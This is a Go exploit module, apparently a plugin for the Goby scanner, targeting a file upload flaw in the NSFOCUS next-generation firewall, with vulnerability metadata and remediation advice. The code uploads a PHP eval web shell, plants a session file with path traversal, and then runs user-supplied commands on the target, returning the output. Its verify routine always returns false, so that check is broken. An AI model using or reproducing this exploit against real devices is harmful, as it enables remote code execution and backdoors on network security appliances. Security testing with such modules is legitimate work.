package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NSFOCUS NGFW arbitrary file upload vulnerability",
    "Description": "<p>NSFOCUS next-generation firewall is a dedicated security firewall device.</p><p>There is a file upload vulnerability in the NSFOCUS next-generation firewall. Attackers can upload malicious code to the server through the interface /api/v1/device/bugsInfo, which may cause webpage tampering on the server, the website is hung, the server is remotely controlled, and the server is installed. back door and other serious consequences.</p>",
    "Product": "NSFOCUS-NGFW",
    "Homepage": "http://www.nsfocus.com.cn/",
    "DisclosureDate": "2023-1-3",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "banner=\"PHPSESSID_NF\" || header=\"PHPSESSID_NF\"",
    "GobyQuery": "banner=\"PHPSESSID_NF\" || header=\"PHPSESSID_NF\"",
    "Level": "3",
    "Impact": "<p>NSFOCUS next-generation firewall is a dedicated security firewall device.</p><p>There is a file upload vulnerability in the NSFOCUS next-generation firewall. Attackers can upload malicious code to the server through the interface /api/v1/device/bugsInfo, which may cause webpage tampering on the server, the website is hung, the server is remotely controlled, and the server is installed. back door and other serious consequences.</p>",
    "Recommendation": "<p>1.The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution:<a href=\"http://www.nsfocus.com.cn/\">http://www.nsfocus.com.cn/</a></p><p>2. Disable the execution permission for the directory where files are uploaded.</p><p>3. The suffix of uploaded files should be whitelist and other restrictions.</p><p>4. The saving path should be restricted and verified.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "phpinfo();"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "绿盟下一代防火墙文件上传漏洞",
            "Product": "NSFOCUS-下一代防火墙",
            "Description": "<p>绿盟下一代防火墙是一款专用安全防火墙设备。</p><p>绿盟下一代防火墙存在文件上传漏洞，攻击者可通过接口 /api/v1/device/bugsInfo 上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果。</p>",
            "Recommendation": "<p>1、官方未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"http://www.nsfocus.com.cn/\" target=\"_blank\">http://www.nsfocus.com.cn/</a></p><p>2、文件上传的存储目录禁用执行权限。</p><p>3、上传文件的后缀应该加白名单等限制。</p><p>4、保存路径应作限制和校验。</p>",
            "Impact": "<p>绿盟下一代防火墙是一款专用安全防火墙设备。</p><p>绿盟下一代防火墙存在文件上传漏洞，攻击者可通过接口 /api/v1/device/bugsInfo 上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "NSFOCUS NGFW arbitrary file upload vulnerability",
            "Product": "NSFOCUS-NGFW",
            "Description": "<p>NSFOCUS next-generation firewall is a dedicated security firewall device.</p><p>There is a file upload vulnerability in the NSFOCUS next-generation firewall. Attackers can upload malicious code to the server through the interface /api/v1/device/bugsInfo, which may cause webpage tampering on the server, the website is hung, the server is remotely controlled, and the server is installed. back door and other serious consequences.</p>",
            "Recommendation": "<p>1.The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution:<a href=\"http://www.nsfocus.com.cn/\" target=\"_blank\">http://www.nsfocus.com.cn/</a></p><p>2. Disable the execution permission for the directory where files are uploaded.</p><p>3. The suffix of uploaded files should be whitelist and other restrictions.</p><p>4. The saving path should be restricted and verified.</p>",
            "Impact": "<p>NSFOCUS next-generation firewall is a dedicated security firewall device.</p><p>There is a file upload vulnerability in the NSFOCUS next-generation firewall. Attackers can upload malicious code to the server through the interface /api/v1/device/bugsInfo, which may cause webpage tampering on the server, the website is hung, the server is remotely controlled, and the server is installed. back door and other serious consequences.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var exploit_0487 = func(u *httpclient.FixUrl) bool {
				cfg := httpclient.NewPostRequestConfig("/api/v1/device/bugsInfo")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
				cfg.Header.Store("Accept-Language", "zh-CN,en-US;q=0.7,en;q=0.3")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Upgrade-Insecure-Requests", "1")
				cfg.Header.Store("Sec-Fetch-Dest", "document")
				cfg.Header.Store("Sec-Fetch-Mode", "navigate")
				cfg.Header.Store("Sec-Fetch-Site", "none")
				cfg.Header.Store("Sec-Fetch-User", "?1")
				cfg.Header.Store("Te", "trailers")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarySWiciBYSpl5cubaw")

				cfg.Data = "------WebKitFormBoundarySWiciBYSpl5cubaw\nContent-Disposition: form-data; name=\"file\"; filename=\"compose.php\";\n\n<?php @eval($_REQUEST['nsfocus']); ?>\n------WebKitFormBoundarySWiciBYSpl5cubaw--"
				cfg.VerifyTls = false
				cfg.FollowRedirect = true
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if strings.Contains(resp.Utf8Html, "DEVICE_NAME") && strings.Contains(resp.Utf8Html, "upload file success") {
						cfg.Data = "------WebKitFormBoundarySWiciBYSpl5cubaw\nContent-Disposition: form-data; name=\"file\"; filename=\"sess_fdffeb5c62ff6af75a2fa60413decefa\";\n\nlang|s:52:\"../../../../../../../../../../../../../../../../tmp/\";\n------WebKitFormBoundarySWiciBYSpl5cubaw--"
						if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
							if strings.Contains(resp.Utf8Html, "DEVICE_NAME") && strings.Contains(resp.Utf8Html, "upload file success") {
								return true
							}
						}
					}
				}
				return false
			}

			if exploit_0487(u) {
				cfg := httpclient.NewGetRequestConfig("/mail/include/header_main.php?nsfocus=phpinfo();")
				//	exp中有写：Cookie: PHPSESSIONID=fdffeb5c62ff6af75a2fa60413decefa;
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if strings.Contains(resp.Utf8Html, "PHP Version") {
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var exploit_0487 = func(u *httpclient.FixUrl) bool {
				cfg := httpclient.NewPostRequestConfig("/api/v1/device/bugsInfo")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
				cfg.Header.Store("Accept-Language", "zh-CN,en-US;q=0.7,en;q=0.3")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Upgrade-Insecure-Requests", "1")
				cfg.Header.Store("Sec-Fetch-Dest", "document")
				cfg.Header.Store("Sec-Fetch-Mode", "navigate")
				cfg.Header.Store("Sec-Fetch-Site", "none")
				cfg.Header.Store("Sec-Fetch-User", "?1")
				cfg.Header.Store("Te", "trailers")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarySWiciBYSpl5cubaw")

				cfg.Data = "------WebKitFormBoundarySWiciBYSpl5cubaw\nContent-Disposition: form-data; name=\"file\"; filename=\"compose.php\";\n\n<?php @eval($_REQUEST['nsfocus']); ?>\n------WebKitFormBoundarySWiciBYSpl5cubaw--"
				cfg.VerifyTls = false
				cfg.FollowRedirect = true
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if strings.Contains(resp.Utf8Html, "DEVICE_NAME") && strings.Contains(resp.Utf8Html, "upload file success") {
						cfg.Data = "------WebKitFormBoundarySWiciBYSpl5cubaw\nContent-Disposition: form-data; name=\"file\"; filename=\"sess_fdffeb5c62ff6af75a2fa60413decefa\";\n\nlang|s:52:\"../../../../../../../../../../../../../../../../tmp/\";\n------WebKitFormBoundarySWiciBYSpl5cubaw--"
						if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
							if strings.Contains(resp.Utf8Html, "DEVICE_NAME") && strings.Contains(resp.Utf8Html, "upload file success") {
								return true
							}
						}
					}
				}
				return false
			}

			cmd := ss.Params["cmd"].(string)
			cmd = url.QueryEscape(cmd)
			if exploit_0487(expResult.HostInfo) {
				cfg := httpclient.NewGetRequestConfig("/mail/include/header_main.php?nsfocus=" + cmd)
				//	exp中有写：Cookie: PHPSESSIONID=fdffeb5c62ff6af75a2fa60413decefa;
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
